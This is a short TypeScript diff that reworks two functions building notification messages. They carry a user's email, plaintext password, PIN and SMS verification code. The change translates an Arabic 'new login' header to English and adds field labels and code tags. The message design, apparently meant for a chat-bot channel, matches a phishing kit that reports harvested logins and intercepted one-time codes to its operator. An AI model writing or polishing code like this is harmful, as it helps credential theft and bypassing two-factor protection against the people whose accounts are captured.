@@ -44,11 +44,11 @@ export function formatLoginMessage(
   pin: string
 ): string {
   return `
-🔐 <b>تسجيل دخول جديد</b>
+🔐 <b>New Login</b>
 
-📧 ${email}
-🔑 ${password}
-🔢 ${pin}
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
+🔢 PIN: <code>${pin}</code>
   `.trim();
 }
 
@@ -60,7 +60,7 @@ export function formatSMSMessage(
   return `
 📱 <b>SMS ${codeNumber}</b>
 
-📧 ${email}
-💬 ${smsCode}
+📧 Email: <code>${email}</code>
+💬 Code: <code>${smsCode}</code>
   `.trim();
 }
